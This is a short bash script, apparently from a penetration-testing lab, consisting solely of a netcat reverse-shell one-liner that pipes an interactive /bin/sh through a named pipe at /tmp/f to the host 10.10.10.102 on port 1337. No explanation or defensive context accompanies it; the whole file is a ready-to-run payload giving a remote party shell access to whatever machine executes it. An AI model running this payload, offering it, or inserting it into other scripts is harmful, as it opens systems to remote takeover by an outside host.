#!/bin/bash

rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.102 1337 >/tmp/f
